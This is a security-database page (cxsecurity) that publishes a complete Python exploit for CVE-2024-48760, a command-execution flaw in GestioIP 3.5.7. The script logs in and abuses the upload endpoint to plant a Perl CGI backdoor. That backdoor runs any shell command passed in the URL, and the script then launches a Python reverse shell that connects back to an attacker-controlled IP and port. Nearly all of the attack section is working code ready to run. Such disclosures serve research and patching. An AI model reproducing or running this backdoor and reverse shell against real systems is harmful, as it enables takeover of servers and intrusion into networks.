---
title: GestioIP 3.5.7 Remote Command Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025040021
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-16
fetch_date: 2025-10-06T22:03:54.966143
---

# GestioIP 3.5.7 Remote Command Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **GestioIP 3.5.7 Remote Command Execution (RCE)** **2025.04.15**  Credit:  **[m4xth0r](https://cxsecurity.com/author/m4xth0r/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-48760](https://cxsecurity.com/cveshow/CVE-2024-48760/ "Click to see CVE-2024-48760")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

# Exploit Title: GestioIP 3.5.7 - Remote Command Execution (RCE)
# Exploit Author: m4xth0r (Maximiliano Belino)
# Author website: https://maxibelino.github.io/
# Author email (max.cybersecurity at belino.com)
# GitHub disclosure link: https://github.com/maxibelino/CVEs/tree/main/CVE-2024-48760
# Date: 2025-01-13
# Vendor Homepage: https://www.gestioip.net/
# Software Link: https://www.gestioip.net/en/download/
# Version: GestioIP v3.5.7
# Tested on: Kali Linux
# CVE: CVE-2024-48760
import requests
import sys
# Config
username = "gipadmin"
password = "PASSWORD"
domain = "localhost"
local\_ip = "10.20.0.1"
local\_port = 443
target\_url = f"http://{domain}/gestioip/api/upload.cgi"
# CGI Backdoor Perl
backdoor\_code = """#!/usr/bin/perl -w
use strict;
print "Cache-Control: no-cache\\n";
print "Content-type: text/html\\n\\n";
my $req = $ENV{QUERY\_STRING};
chomp ($req);
$req =~ s/%20/ /g;
$req =~ s/%3b/;/g;
$req =~ s/%7c/|/gi;
$req =~ s/%27/'/g;
$req =~ s/%22/"/g;
$req =~ s/%5D/]/g;
$req =~ s/%5B/[/g;
print "<html><body>";
print '<!-- CGI backdoor -->';
if (!$req) {
print "Usage: http://domain/gestioip/api/upload.cgi?whoami";
} else {
print "Executing: $req";
}
print "<pre>";
my @cmd = `$req`;
print "</pre>";
foreach my $line (@cmd) {
print $line . "<br/>";
}
print "</body></html>";
"""
# Exploit functions
def upload\_file(session, file\_name, file\_data):
"""Uploads the file to the server"""
files = {
'file\_name': (None, file\_name),
'leases\_file': (file\_name, file\_data)
}
response = session.post(target\_url, files=files)
if "OK" not in response.text:
print(f"[!] Error uploading {file\_name}.")
sys.exit(1)
return response
def run\_command(session, cmd):
"""Execute a command in the server through the vuln"""
url = target\_url + '?' + cmd
resp = session.get(url)
print(resp.text)
def backdoor\_exists(session):
"""Verifies if backdoor is already uploaded or not"""
response = session.get(target\_url + "?whoami")
if "www-data" in response.text:
return True # backdoor already uploaded
return False # backdoor not uploaded yet
if \_\_name\_\_ == '\_\_main\_\_':
with requests.Session() as session:
session.auth = (username, password)
# Verify if backdoor is already uploaded
if not backdoor\_exists(session):
print("\n[!] Uploading backdoor...\n")
upload\_file(session, 'upload.cgi', backdoor\_code)
else:
print("\n[+] Backdoor already uploaded. Continue...\n")
# Execute the reverse shell
print("\n[!] Executing reverse shell...\n")
reverse\_shell\_cmd = f'python3 -c "import socket, subprocess, os; s=socket.socket(socket.AF\_INET, socket.SOCK\_STREAM); s.connect((\'{local\_ip}\', {local\_port})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p=subprocess.call([\'/bin/sh\', \'-i\']);"'
run\_command(session, reverse\_shell\_cmd)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040021)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top